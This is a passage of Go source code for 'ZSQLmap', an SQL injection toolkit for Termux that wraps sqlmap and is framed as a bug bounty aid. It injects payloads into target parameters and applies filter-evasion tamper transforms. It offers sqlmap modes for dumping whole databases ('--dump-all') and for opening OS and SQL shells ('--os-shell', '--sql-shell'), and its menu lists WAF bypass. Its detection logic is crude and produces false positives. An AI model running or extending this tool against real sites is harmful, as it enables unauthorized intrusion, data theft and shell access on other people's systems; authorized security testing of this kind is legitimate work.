            if req.Headers == nil {
                req.Headers = make(map[string]string)
            }
            req.Headers["Content-Type"] = "application/json"
        }
    } else if req.Data != nil {
        formData := url.Values{}
        for k, v := range req.Data {
            formData.Set(k, v)
        }
        body = strings.NewReader(formData.Encode())
        if req.Headers == nil {
            req.Headers = make(map[string]string)
        }
        req.Headers["Content-Type"] = "application/x-www-form-urlencoded"
    }

    httpReq, err := http.NewRequest(req.Method, req.URL, body)
    if err != nil {
        return nil, err
    }

    // Add query parameters
    if req.Params != nil {
        q := httpReq.URL.Query()
        for k, v := range req.Params {
            q.Add(k, v)
        }
        httpReq.URL.RawQuery = q.Encode()
    }

    // Add headers
    httpReq.Header.Set("User-Agent", "ZSQLmap/1.0")
    httpReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    httpReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
    httpReq.Header.Set("Connection", "keep-alive")

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    // Add cookies
    if req.Cookies != nil {
        for k, v := range req.Cookies {
            httpReq.AddCookie(&http.Cookie{Name: k, Value: v})
        }
    }

    // Add auth
    if req.Auth != nil {
        switch req.Auth.Type {
        case "basic":
            httpReq.SetBasicAuth(req.Auth.Username, req.Auth.Password)
        case "bearer":
            httpReq.Header.Set("Authorization", "Bearer "+req.Auth.Token)
        }
    }

    return httpReq, nil
}

func (rb *RequestBridge) generateCacheKey(req *CapturedRequest) string {
    data := fmt.Sprintf("%s:%s:%v:%v:%v", req.Method, req.URL, req.Params, req.Data, req.JSON)
    hash := md5.Sum([]byte(data))
    return base64.URLEncoding.EncodeToString(hash[:])
}

func (rb *RequestBridge) saveRequestToFile(req *CapturedRequest, httpReq *http.Request) (string, error) {
    timestamp := req.Timestamp.Format("20060102_150405")
    filename := filepath.Join(rb.requestDir, fmt.Sprintf("request_%s.req", timestamp))

    var builder strings.Builder

    // Request line
    builder.WriteString(fmt.Sprintf("%s %s HTTP/1.1\n", req.Method, httpReq.URL.Path))

    // Headers
    builder.WriteString(fmt.Sprintf("Host: %s\n", httpReq.Host))
    for k, v := range httpReq.Header {
        builder.WriteString(fmt.Sprintf("%s: %s\n", k, strings.Join(v, ", ")))
    }
    builder.WriteString("\n")

    // Body
    if httpReq.Body != nil {
        bodyBytes, _ := io.ReadAll(httpReq.Body)
        httpReq.Body = io.NopCloser(bytes.NewReader(bodyBytes))
        builder.Write(bodyBytes)
    }

    err := os.WriteFile(filename, []byte(builder.String()), 0644)
    return filename, err
}

func (rb *RequestBridge) saveResponseToFile(resp *http.Response, body []byte, timestamp time.Time) {
    ts := timestamp.Format("20060102_150405")
    filename := filepath.Join(rb.requestDir, fmt.Sprintf("response_%s.txt", ts))

    var builder strings.Builder
    builder.WriteString(fmt.Sprintf("HTTP/%d.%d %d %s\n",
        resp.ProtoMajor, resp.ProtoMinor, resp.StatusCode, resp.Status))

    for k, v := range resp.Header {
        builder.WriteString(fmt.Sprintf("%s: %s\n", k, strings.Join(v, ", ")))
    }
    builder.WriteString("\n")
    builder.Write(body)

    os.WriteFile(filename, []byte(builder.String()), 0644)
}

func (rb *RequestBridge) checkSQLInjection(response string) bool {
    sqlErrors := []string{
        "sql syntax",
        "mysql_fetch",
        "ora-",
        "postgresql",
        "sqlite",
        "syntax error",
        "unclosed quotation",
        "unknown column",
        "mysql error",
        "warning: mysql",
        "driver error",
        "odbc",
        "db2",
        "microsoft ole db",
        "microsoft oledb",
        "sql server",
        "unclosed string",
        "unterminated string",
        "unexpected end of command",
    }

    responseLower := strings.ToLower(response)
    for _, err := range sqlErrors {
        if strings.Contains(responseLower, err) {
            return true
        }
    }

    return false
}

func (rb *RequestBridge) getVulnLevel(vulnerable bool) string {
    if vulnerable {
        return "HIGH"
    }
    return "LOW"
}

func (rb *RequestBridge) mapToJSON(m map[string]string) string {
    if m == nil {
        return ""
    }
    data, _ := json.Marshal(m)
    return string(data)
}

// ========== SQL INJECTION DETECTOR ==========
type SQLiDetector struct {
    bridge      *RequestBridge
    db          *AuditDatabase
    config      Config
    payloads    []Payload
    tamper      []Tamper
    results     chan Vulnerability
    wg          sync.WaitGroup
    stats       DetectorStats
}

type DetectorStats struct {
    TestsPerformed int64
    VulnerabilitiesFound int64
    FalsePositives int64
    StartTime      time.Time
}

func NewSQLiDetector(config Config, bridge *RequestBridge, db *AuditDatabase) *SQLiDetector {
    return &SQLiDetector{
        bridge:   bridge,
        db:       db,
        config:   config,
        payloads: SQLPayloads,
        tamper:   TamperScripts,
        results:  make(chan Vulnerability, 1000),
        stats:    DetectorStats{StartTime: time.Now()},
    }
}

func (sd *SQLiDetector) Detect(ctx context.Context, target string, params map[string]string, method string) <-chan Vulnerability {
    go func() {
        defer close(sd.results)

        bar := progressbar.NewOptions(len(sd.payloads)*len(params),
            progressbar.OptionSetDescription("Testing SQL injection"),
            progressbar.OptionShowCount(),
            progressbar.OptionShowIts(),
            progressbar.OptionSetTheme(progressbar.Theme{
                Saucer:        "=",
                SaucerHead:    ">",
                SaucerPadding: " ",
                BarStart:      "[",
                BarEnd:        "]",
            }))

        sem := semaphore.NewWeighted(sd.config.MaxWorkers)

        for paramName := range params {
            for _, payload := range sd.payloads {
                if err := sem.Acquire(ctx, 1); err != nil {
                    break
                }

                sd.wg.Add(1)
                go func(pName string, pl Payload) {
                    defer sem.Release(1)
                    defer sd.wg.Done()
                    defer bar.Add(1)

                    select {
                    case <-ctx.Done():
                        return
                    default:
                    }

                    // Apply tamper if enabled
                    testPayload := pl.Payload
                    if sd.config.EnableTamper {
                        testPayload = sd.applyTamper(pl.Payload)
                    }

                    // Create test request
                    testParams := make(map[string]string)
                    for k, v := range params {
                        testParams[k] = v
                    }
                    testParams[pName] = testPayload

                    req := &CapturedRequest{
                        Method:    method,
                        URL:       target,
                        Params:    testParams,
                        Timestamp: time.Now(),
                    }

                    // Send request
                    resp, body, _, err := sd.bridge.CaptureRequest(ctx, req)
                    if err != nil {
                        return
                    }

                    atomic.AddInt64(&sd.stats.TestsPerformed, 1)

                    // Check for vulnerability
                    if sd.isVulnerable(resp, body, pl) {
                        vuln := sd.createVulnerability(target, pName, pl, string(body), "")
                        sd.results <- vuln
                        atomic.AddInt64(&sd.stats.VulnerabilitiesFound, 1)
                    }
                }(paramName, payload)
            }
        }

        sd.wg.Wait()
        bar.Finish()
    }()

    return sd.results
}

func (sd *SQLiDetector) applyTamper(payload string) string {
    // Simple tamper implementations
    tampered := payload

    // Random case
    if strings.Contains(payload, "SELECT") || strings.Contains(payload, "UNION") {
        result := make([]rune, len(payload))
        for i, c := range payload {
            if i%2 == 0 {
                result[i] = unicode.ToUpper(c)
            } else {
                result[i] = unicode.ToLower(c)
            }
        }
        tampered = string(result)
    }

    // Space to comment
    tampered = strings.ReplaceAll(tampered, " ", "/**/")

    // Hex encode if too long
    if len(tampered) > 100 {
        tampered = "0x" + hex.EncodeToString([]byte(tampered))
    }

    return tampered
}

func (sd *SQLiDetector) isVulnerable(resp *http.Response, body []byte, payload Payload) bool {
    bodyStr := string(body)

    // Check for SQL errors
    sqlErrors := []string{
        "sql syntax",
        "mysql_fetch",
        "ora-",
        "postgresql",
        "sqlite",
        "syntax error",
        "unclosed quotation",
        "unknown column",
        "mysql error",
        "warning: mysql",
        "driver error",
        "odbc",
        "db2",
        "microsoft ole db",
        "microsoft oledb",
        "sql server",
        "unclosed string",
        "unterminated string",
        "unexpected end of command",
        "supplied argument is not a valid",
        "query failed",
        "database error",
        "db error",
    }

    for _, err := range sqlErrors {
        if strings.Contains(strings.ToLower(bodyStr), err) {
            return true
        }
    }

    // Time-based detection
    if payload.Type == "time" && resp != nil {
        // Check if response took longer than expected
        // In real implementation would measure response time
    }

    // Boolean-based detection
    if payload.Type == "boolean" {
        // Compare with baseline
        if strings.Contains(bodyStr, "Welcome") || 
           strings.Contains(bodyStr, "Error") ||
           strings.Contains(bodyStr, "Invalid") ||
           strings.Contains(bodyStr, "Incorrect") {
            return true
        }
    }

    // Union-based detection
    if payload.Type == "union" {
        if strings.Contains(bodyStr, "1") && 
           strings.Contains(bodyStr, "2") && 
           strings.Contains(bodyStr, "3") {
            return true
        }
    }

    return false
}

func (sd *SQLiDetector) createVulnerability(target, param string, payload Payload, evidence, reqFile string) Vulnerability {
    severity := "Medium"
    cvss := 6.5
    cwe := "CWE-89"

    switch payload.Type {
    case "union":
        severity = "Critical"
        cvss = 9.8
    case "error":
        severity = "High"
        cvss = 8.5
    case "time":
        severity = "Medium"
        cvss = 6.5
    case "auth_bypass":
        severity = "Critical"
        cvss = 9.1
        cwe = "CWE-287"
    case "command":
        severity = "Critical"
        cvss = 9.5
        cwe = "CWE-78"
    case "file":
        severity = "High"
        cvss = 7.5
        cwe = "CWE-73"
    }

    return Vulnerability{
        Type:        "SQL Injection",
        Parameter:   param,
        Payload:     payload.Payload,
        Dbms:        payload.Dbms,
        Confidence:  85,
        Severity:    severity,
        Description: fmt.Sprintf("SQL injection vulnerability detected using %s technique", payload.Name),
        Proof:       evidence[:min(200, len(evidence))],
        CWE:         cwe,
        CVSS:        cvss,
        Timestamp:   time.Now(),
    }
}

// ========== SQLMAP ENGINE ==========
type SQLmapEngine struct {
    path        string
    db          *AuditDatabase
    bridge      *RequestBridge
    detector    *SQLiDetector
    outputDir   string
    running     bool
    mu          sync.Mutex
}

func NewSQLmapEngine(config Config, db *AuditDatabase, bridge *RequestBridge) *SQLmapEngine {
    os.MkdirAll(config.OutputDir, 0755)
    return &SQLmapEngine{
        path:      config.SQLmapPath,
        db:        db,
        bridge:    bridge,
        detector:  NewSQLiDetector(config, bridge, db),
        outputDir: config.OutputDir,
    }
}

func (se *SQLmapEngine) CheckInstalled() bool {
    cmd := exec.Command("which", se.path)
    if err := cmd.Run(); err == nil {
        return true
    }

    color.Yellow("[!] SQLmap not found. Attempting to install...")
    installCmd := exec.Command("pkg", "install", "sqlmap", "-y")
    if err := installCmd.Run(); err == nil {
        color.Green("[✓] SQLmap installed successfully!")
        return true
    }

    color.Red("[✗] Failed to install sqlmap. Install manually: pkg install sqlmap")
    return false
}

func (se *SQLmapEngine) Run(ctx context.Context, target string, mode string, extraOptions string) (*SQLmapResult, error) {
    scanID := fmt.Sprintf("scan_%d", time.Now().UnixNano())
    startTime := time.Now()

    color.Cyan("\n[→] Scan ID: %s", scanID)
    color.Cyan("[→] Target: %s", target)
    color.Cyan("[→] Mode: %s", mode)

    // Get base options based on mode
    baseOptions := se.getModeOptions(mode)

    // Build command
    outputDir := filepath.Join(se.outputDir, scanID)
    os.MkdirAll(outputDir, 0755)

    cmdStr := fmt.Sprintf("%s -u \"%s\" %s %s --output-dir=\"%s\"",
        se.path, target, baseOptions, extraOptions, outputDir)

    color.Cyan("[→] Command: %s", cmdStr)

    // Create command with timeout
    ctx, cancel := context.WithTimeout(ctx, 5*time.Minute)
    defer cancel()

    cmd := exec.CommandContext(ctx, "sh", "-c", cmdStr)

    // Capture output
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        return nil, err
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        return nil, err
    }

    // Start command
    if err := cmd.Start(); err != nil {
        return nil, err
    }

    // Read output in real-time
    var vulnerabilities []string
    var databases []string
    var tables []string

    scanner := bufio.NewScanner(io.MultiReader(stdout, stderr))
    for scanner.Scan() {
        line := scanner.Text()
        fmt.Println(line)

        // Parse output
        if strings.Contains(line, "sqlmap identified") {
            vulnerabilities = append(vulnerabilities, line)
            se.logVulnerability(target, line)
        }
        if strings.Contains(line, "available databases") {
            se.parseDatabases(line, scanID)
        }
        if strings.Contains(line, "Table:") {
            tables = append(tables, line)
        }
    }

    // Wait for completion
    err = cmd.Wait()
    duration := time.Since(startTime)

    result := &SQLmapResult{
        ScanID:         scanID,
        Target:         target,
        Mode:           mode,
        StartTime:      startTime,
        EndTime:        time.Now(),
        Duration:       duration,
        OutputDir:      outputDir,
        Vulnerabilities: vulnerabilities,
        Databases:      databases,
        Tables:         tables,
        Success:        err == nil,
    }

    // Log to database
    se.logScan(result)

    return result, err
}

func (se *SQLmapEngine) RunOnRequest(ctx context.Context, requestFile string, mode string, extraOptions string) (*SQLmapResult, error) {
    if _, err := os.Stat(requestFile); os.IsNotExist(err) {
        return nil, fmt.Errorf("request file not found: %s", requestFile)
    }

    scanID := fmt.Sprintf("scan_%d", time.Now().UnixNano())
    startTime := time.Now()

    color.Cyan("\n[→] Scan ID: %s", scanID)
    color.Cyan("[→] Request File: %s", requestFile)
    color.Cyan("[→] Mode: %s", mode)

    baseOptions := se.getModeOptions(mode)
    outputDir := filepath.Join(se.outputDir, scanID)
    os.MkdirAll(outputDir, 0755)

    cmdStr := fmt.Sprintf("%s -r \"%s\" %s %s --output-dir=\"%s\"",
        se.path, requestFile, baseOptions, extraOptions, outputDir)

    color.Cyan("[→] Command: %s", cmdStr)

    ctx, cancel := context.WithTimeout(ctx, 5*time.Minute)
    defer cancel()

    cmd := exec.CommandContext(ctx, "sh", "-c", cmdStr)

    stdout, _ := cmd.StdoutPipe()
    stderr, _ := cmd.StderrPipe()

    if err := cmd.Start(); err != nil {
        return nil, err
    }

    var vulnerabilities []string
    scanner := bufio.NewScanner(io.MultiReader(stdout, stderr))
    for scanner.Scan() {
        line := scanner.Text()
        fmt.Println(line)

        if strings.Contains(line, "sqlmap identified") {
            vulnerabilities = append(vulnerabilities, line)
            se.logVulnerability(requestFile, line)
        }
    }

    err := cmd.Wait()
    duration := time.Since(startTime)

    result := &SQLmapResult{
        ScanID:         scanID,
        Target:         requestFile,
        Mode:           mode,
        StartTime:      startTime,
        EndTime:        time.Now(),
        Duration:       duration,
        OutputDir:      outputDir,
        Vulnerabilities: vulnerabilities,
        Success:        err == nil,
    }

    se.logScan(result)

    return result, err
}

func (se *SQLmapEngine) getModeOptions(mode string) string {
    options := map[string]string{
        "basic":       "--batch --random-agent --level=1 --risk=1",
        "standard":    "--batch --random-agent --level=3 --risk=2",
        "aggressive":  "--batch --random-agent --level=5 --risk=3",
        "stealth":     "--batch --random-agent --delay=1 --timeout=10",
        "crawl":       "--batch --random-agent --crawl=3",
        "full":        "--batch --random-agent --level=5 --risk=3 --dbs --tables",
        "dump":        "--batch --random-agent --dump-all",
        "os_shell":    "--batch --random-agent --os-shell",
        "sql_shell":   "--batch --random-agent --sql-shell",
    }

    if opt, ok := options[mode]; ok {
        return opt
    }
    return options["basic"]
}

func (se *SQLmapEngine) logVulnerability(target, evidence string) {
    vuln := &Vulnerability{
        Type:        "SQL Injection",
        Parameter:   "unknown",
        Payload:     "SQLmap detected",
        Confidence:  90,
        Severity:    "High",
        Description: evidence,
        Proof:       evidence,
        CWE:         "CWE-89",
        CVSS:        8.5,
        Timestamp:   time.Now(),
    }

    if _, err := se.db.LogVulnerability(vuln); err != nil {
        color.Yellow("[!] Failed to log vulnerability: %v", err)
    }
}

func (se *SQLmapEngine) parseDatabases(line, scanID string) {
    discovery := &Discovery{
        AuditID:     0, // Would need actual audit ID
        Type:        "database",
        Data:        line,
        ExtractedAt: time.Now(),
    }

    if _, err := se.db.LogDiscovery(discovery); err != nil {
        color.Yellow("[!] Failed to log discovery: %v", err)
    }
}

func (se *SQLmapEngine) logScan(result *SQLmapResult) {
    auditLog := &AuditLog{
        Timestamp:         result.StartTime,
        TargetURL:         result.Target,
        Method:            "SQLMAP",
        Result:            fmt.Sprintf("Found %d vulnerabilities", len(result.Vulnerabilities)),
        VulnerabilityLevel: result.Mode,
        SQLmapCommand:     fmt.Sprintf("sqlmap %s mode", result.Mode),
        Duration:          result.Duration.Seconds(),
    }

    if _, err := se.db.LogAudit(auditLog); err != nil {
        color.Yellow("[!] Failed to log scan: %v", err)
    }
}

type SQLmapResult struct {
    ScanID         string
    Target         string
    Mode           string
    StartTime      time.Time
    EndTime        time.Time
    Duration       time.Duration
    OutputDir      string
    Vulnerabilities []string
    Databases      []string
    Tables         []string
    Success        bool
}

// ========== REPORT GENERATOR ==========
type ReportGenerator struct {
    outputDir string
    db        *AuditDatabase
}

func NewReportGenerator(outputDir string, db *AuditDatabase) *ReportGenerator {
    os.MkdirAll(outputDir, 0755)
    return &ReportGenerator{
        outputDir: outputDir,
        db:        db,
    }
}

func (rg *ReportGenerator) GenerateBugBountyReport() error {
    timestamp := time.Now().Format("20060102_150405")
    filename := filepath.Join(rg.outputDir, fmt.Sprintf("bug_bounty_report_%s.md", timestamp))

    // Get vulnerabilities
    vulns, err := rg.db.GetVulnerabilities("", "")
    if err != nil {
        return err
    }

    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    // Write report header
    fmt.Fprintf(file, "# Bug Bounty Security Report\n\n")
    fmt.Fprintf(file, "**Generated:** %s\n\n", time.Now().Format("2006-01-02 15:04:05"))
    fmt.Fprintf(file, "**Total Vulnerabilities:** %d\n\n", len(vulns))

    if len(vulns) == 0 {
        fmt.Fprintf(file, "## ✅ No Vulnerabilities Found\n\n")
        fmt.Fprintf(file, "The application appears to be secure against SQL injection attacks.\n")
        return nil
    }

    // Group by severity
    critical := 0
    high := 0
    medium := 0
    low := 0

    for _, v := range vulns {
        switch v.Severity {
        case "Critical":
            critical++
        case "High":
            high++
        case "Medium":
            medium++
        case "Low":
            low++
        }
    }

    fmt.Fprintf(file, "## 📊 Summary\n\n")
    fmt.Fprintf(file, "| Severity | Count | DBMS |\n")
    fmt.Fprintf(file, "|----------|-------|------|\n")
    fmt.Fprintf(file, "| 🔴 Critical | %d | Multiple |\n", critical)
    fmt.Fprintf(file, "| 🟠 High | %d | Multiple |\n", high)
    fmt.Fprintf(file, "| 🟡 Medium | %d | Multiple |\n", medium)
    fmt.Fprintf(file, "| 🟢 Low | %d | Multiple |\n\n", low)

    // Detailed findings
    fmt.Fprintf(file, "## 🔥 Detailed Findings\n\n")

    for i, vuln := range vulns {
        severityEmoji := "⚪"
        switch vuln.Severity {
        case "Critical":
            severityEmoji = "🔴"
        case "High":
            severityEmoji = "🟠"
        case "Medium":
            severityEmoji = "🟡"
        case "Low":
            severityEmoji = "🟢"
        }

        fmt.Fprintf(file, "### %d. %s Vulnerability\n\n", i+1, severityEmoji)
        fmt.Fprintf(file, "- **Type:** %s\n", vuln.Type)
        fmt.Fprintf(file, "- **Parameter:** `%s`\n", vuln.Parameter)
        fmt.Fprintf(file, "- **DBMS:** %s\n", vuln.Dbms)
        fmt.Fprintf(file, "- **Severity:** %s\n", vuln.Severity)
        fmt.Fprintf(file, "- **Confidence:** %d%%\n", vuln.Confidence)
        fmt.Fprintf(file, "- **CWE:** %s\n", vuln.CWE)
        fmt.Fprintf(file, "- **CVSS:** %.1f\n\n", vuln.CVSS)
        fmt.Fprintf(file, "**Description:**\n%s\n\n", vuln.Description)
        fmt.Fprintf(file, "**Payload:**\n```sql\n%s\n```\n\n", vuln.Payload)
        fmt.Fprintf(file, "**Evidence:**\n```\n%s\n```\n\n", vuln.Proof)
        fmt.Fprintf(file, "**Remediation:**\n- Use parameterized queries\n- Implement input validation\n- Apply least privilege principle\n\n")
        fmt.Fprintf(file, "---\n\n")
    }

    // Recommendations
    fmt.Fprintf(file, "## 💡 Recommendations\n\n")
    fmt.Fprintf(file, "1. **Use Prepared Statements** - Always use parameterized queries\n")
    fmt.Fprintf(file, "2. **Input Validation** - Validate and sanitize all user inputs\n")
    fmt.Fprintf(file, "3. **WAF Implementation** - Deploy Web Application Firewall\n")
    fmt.Fprintf(file, "4. **Regular Scanning** - Perform regular security audits\n")
    fmt.Fprintf(file, "5. **Least Privilege** - Limit database user permissions\n")

    color.Green("[✓] Report generated: %s", filename)
    return nil
}

func (rg *ReportGenerator) GenerateJSONReport() error {
    timestamp := time.Now().Format("20060102_150405")
    filename := filepath.Join(rg.outputDir, fmt.Sprintf("scan_report_%s.json", timestamp))

    vulns, err := rg.db.GetVulnerabilities("", "")
    if err != nil {
        return err
    }

    stats := rg.db.GetVulnerabilityStats()

    data := map[string]interface{}{
        "generated": time.Now(),
        "total":     len(vulns),
        "statistics": stats,
        "vulnerabilities": vulns,
    }

    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    return encoder.Encode(data)
}

func (rg *ReportGenerator) GenerateCSVReport() error {
    timestamp := time.Now().Format("20060102_150405")
    filename := filepath.Join(rg.outputDir, fmt.Sprintf("vulnerabilities_%s.csv", timestamp))

    vulns, err := rg.db.GetVulnerabilities("", "")
    if err != nil {
        return err
    }

    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    writer := csv.NewWriter(file)
    defer writer.Flush()

    // Header
    writer.Write([]string{
        "Timestamp", "Type", "Parameter", "Payload", "DBMS",
        "Severity", "Confidence", "CWE", "CVSS", "Description",
    })

    // Data
    for _, v := range vulns {
        writer.Write([]string{
            v.Timestamp.Format("2006-01-02 15:04:05"),
            v.Type,
            v.Parameter,
            v.Payload,
            v.Dbms,
            v.Severity,
            strconv.Itoa(v.Confidence),
            v.CWE,
            fmt.Sprintf("%.1f", v.CVSS),
            v.Description,
        })
    }

    color.Green("[✓] CSV report generated: %s", filename)
    return nil
}

// ========== ZSQLMAP MAIN CLASS ==========
type ZSQLmap struct {
    config     Config
    db         *AuditDatabase
    bridge     *RequestBridge
    engine     *SQLmapEngine
    detector   *SQLiDetector
    reporter   *ReportGenerator
    running    bool
    utils      *Utils
}

func NewZSQLmap(config Config) (*ZSQLmap, error) {
    db, err := NewAuditDatabase(config.DatabaseFile)
    if err != nil {
        return nil, err
    }

    bridge := NewRequestBridge(config, db)
    engine := NewSQLmapEngine(config, db, bridge)
    detector := NewSQLiDetector(config, bridge, db)
    reporter := NewReportGenerator(config.OutputDir, db)

    return &ZSQLmap{
        config:   config,
        db:       db,
        bridge:   bridge,
        engine:   engine,
        detector: detector,
        reporter: reporter,
        running:  true,
        utils:    &Utils{},
    }, nil
}

func (z *ZSQLmap) PrintBanner() {
    banner := `
╔══════════════════════════════════════════════════════════════╗
║                                                             ║
║           Advanced SQL Injection Toolkit for Termux         ║
║                  ZSQLmap - Advance Edition                  ║
║                                                             ║
╚══════════════════════════════════════════════════════════════╝
`
    color.Red(banner)
}

func (z *ZSQLmap) PrintMenu() {
    color.Cyan("\n" + strings.Repeat("=", 70))
    color.White("[1] \033[96mQuick URL Test")
    color.White("[2] \033[96mCapture & Test Request")
    color.White("[3] \033[96mSmart Automated Testing")
    color.White("[4] \033[96mTest Request File (.req)")
    color.White("[5] \033[96mDatabase & Tables Enumeration")
    color.White("[6] \033[96mData Extraction (Dump)")
    color.White("[7] \033[96mAdvanced SQLmap Options")
    color.White("[8] \033[96mCustom Payload Tester")
    color.White("[9] \033[96mWAF Bypass Techniques")
    color.White("[10] \033[96mTime-Based Blind Testing")
    color.White("[11] \033[96mSecond Order Injection")
    color.White("[12] \033[96mOut-of-Band Testing")
    color.White("[13] \033[96mDBMS Fingerprinting")
    color.White("[14] \033[96mView Audit History")
    color.White("[15] \033[96mBug Bounty Workflow")
    color.White("[16] \033[96mGenerate Reports")
    color.White("[17] \033[96mSQLmap Statistics")
    color.White("[18] \033[96mTamper Scripts")
    color.White("[0] \033[91mExit")
    color.Cyan(strings.Repeat("=", 70))
}

func (z *ZSQLmap) Run() {
    // Check sqlmap
    if !z.engine.CheckInstalled() {
        return
    }

    // Setup signal handling
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

    go func() {
        <-sigChan
        color.Yellow("\n[!] Interrupted, saving state...")
        cancel()
        z.running = false
    }()

    for z.running {
        z.utils.ClearScreen()
        z.PrintBanner()
        z.PrintMenu()

        fmt.Print(color.YellowString("\n[?] Select option: "))
        scanner := bufio.NewScanner(os.Stdin)
        scanner.Scan()
        choice := strings.TrimSpace(scanner.Text())

        switch choice {
        case "1":
            z.quickURLTest(ctx)
        case "2":
            z.captureAndTest(ctx)
        case "3":
            z.smartAutomatedTest(ctx)
        case "4":
            z.testRequestFile(ctx)
        case "5":
            z.enumerateDatabase(ctx)
        case "6":
            z.dataExtraction(ctx)
        case "7":
            z.advancedOptions(ctx)
        case "8":
            z.customPayloadTest(ctx)
        case "9":
            z.wafBypassTest(ctx)
        case "10":
            z.timeBasedTest(ctx)
        case "11":
            z.secondOrderTest(ctx)
        case "12":
            z.outOfBandTest(ctx)
        case "13":
            z.dbmsFingerprint(ctx)
        case "14":
            z.viewAuditHistory()
        case "15":
            z.bugBountyWorkflow(ctx)
        case "16":
            z.generateReports()
        case "17":
            z.showStats()
        case "18":
            z.showTamperScripts()
        case "0":
            color.Green("\nGoodbye! 👋")
            z.running = false
        default:
            color.Red("[!] Invalid choice!")
            time.Sleep(1 * time.Second)
        }
    }
}

func (z *ZSQLmap) quickURLTest(ctx context.Context) {
    color.Cyan("\n[ QUICK URL TEST ]")

    fmt.Print(color.YellowString("[?] Target URL: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    // Parse URL to get parameters
    parsed, err := url.Parse(targetURL)
    if err != nil {
        color.Red("[✗] Invalid URL")
        return
    }

    params := make(map[string]string)
    for k, v := range parsed.Query() {
        if len(v) > 0 {
            params[k] = v[0]
        }
    }

    if len(params) == 0 {
        color.Yellow("[!] No parameters found in URL")
        fmt.Print(color.YellowString("[?] Enter parameters (format: param1=value1&param2=value2): "))
        scanner.Scan()
        paramStr := strings.TrimSpace(scanner.Text())
        if paramStr != "" {
            for _, pair := range strings.Split(paramStr, "&") {
                parts := strings.SplitN(pair, "=", 2)
                if len(parts) == 2 {
                    params[parts[0]] = parts[1]
                }
            }
        }
    }

    fmt.Print(color.YellowString("[?] Method (GET/POST) [GET]: "))
    scanner.Scan()
    method := strings.ToUpper(strings.TrimSpace(scanner.Text()))
    if method != "POST" {
        method = "GET"
    }

    // Start detection
    vulnChan := z.detector.Detect(ctx, targetURL, params, method)

    color.Cyan("\n[*] Testing %d parameters with %d payloads...", len(params), len(SQLPayloads))

    found := 0
    for vuln := range vulnChan {
        found++
        color.Red("\n[🔥] VULNERABILITY FOUND!")
        color.Yellow("    Parameter: %s", vuln.Parameter)
        color.Yellow("    Type: %s", vuln.Type)
        color.Yellow("    DBMS: %s", vuln.Dbms)
        color.Yellow("    Severity: %s", vuln.Severity)
        color.Yellow("    Payload: %s", vuln.Payload)
        color.White("    Evidence: %s", vuln.Proof[:min(100, len(vuln.Proof))])

        // Save to database
        z.db.LogVulnerability(&vuln)
    }

    if found == 0 {
        color.Green("\n[✓] No vulnerabilities found")
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) captureAndTest(ctx context.Context) {
    color.Cyan("\n[ CAPTURE & TEST ]")

    fmt.Print(color.YellowString("[?] Method (GET/POST/PUT/DELETE) [GET]: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    method := strings.ToUpper(strings.TrimSpace(scanner.Text()))
    if method == "" {
        method = "GET"
    }

    fmt.Print(color.YellowString("[?] URL: "))
    scanner.Scan()
    targetURL := strings.TrimSpace(scanner.Text())

    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }

    req := &CapturedRequest{
        Method:    method,
        URL:       targetURL,
        Headers:   make(map[string]string),
        Params:    make(map[string]string),
        Data:      make(map[string]string),
        Cookies:   make(map[string]string),
        Timestamp: time.Now(),
    }

    // Get headers
    fmt.Print(color.YellowString("[?] Add headers? (y/N): "))
    scanner.Scan()
    if strings.ToLower(strings.TrimSpace(scanner.Text())) == "y" {
        for {
            fmt.Print(color.YellowString("    Header (format: Name: Value) or empty to stop: "))
            scanner.Scan()
            header := strings.TrimSpace(scanner.Text())
            if header == "" {
                break
            }
            parts := strings.SplitN(header, ":", 2)
            if len(parts) == 2 {
                req.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
            }
        }
    }

    // Get parameters
    if method == "GET" {
        fmt.Print(color.YellowString("[?] Parameters (format: param1=value1&param2=value2): "))
        scanner.Scan()
        paramStr := strings.TrimSpace(scanner.Text())
        if paramStr != "" {
            for _, pair := range strings.Split(paramStr, "&") {
                parts := strings.SplitN(pair, "=", 2)
                if len(parts) == 2 {
                    req.Params[parts[0]] = parts[1]
                }
            }
        }
    } else {
        fmt.Print(color.YellowString("[?] POST data (format: field1=value1&field2=value2): "))
        scanner.Scan()
        dataStr := strings.TrimSpace(scanner.Text())
        if dataStr != "" {
            for _, pair := range strings.Split(dataStr, "&") {
                parts := strings.SplitN(pair, "=", 2)
                if len(parts) == 2 {
                    req.Data[parts[0]] = parts[1]
                }
            }
        }
    }

    // Capture request
    resp, _, reqFile, err := z.bridge.CaptureRequest(ctx, req)
    if err != nil {
        color.Red("[✗] Request failed: %v", err)
        return
    }

    color.Green("[✓] Request captured: %s", reqFile)
    color.Green("[✓] Response: HTTP %d", resp.StatusCode)

    // Quick test
    fmt.Print(color.YellowString("\n[?] Run quick SQL test? (Y/n): "))
    scanner.Scan()
    if strings.ToLower(strings.TrimSpace(scanner.Text())) != "n" {
        params := req.Params
        if len(params) == 0 {
            params = req.Data
        }

        if len(params) > 0 {
            vulnChan := z.detector.Detect(ctx, targetURL, params, method)

            found := 0
            for vuln := range vulnChan {
                found++
                color.Red("\n[🔥] VULNERABILITY FOUND!")
                color.Yellow("    Parameter: %s", vuln.Parameter)
                color.Yellow("    Payload: %s", vuln.Payload)
                z.db.LogVulnerability(&vuln)
            }

            if found == 0 {
                color.Green("\n[✓] No vulnerabilities found in quick test")
            }
        } else {
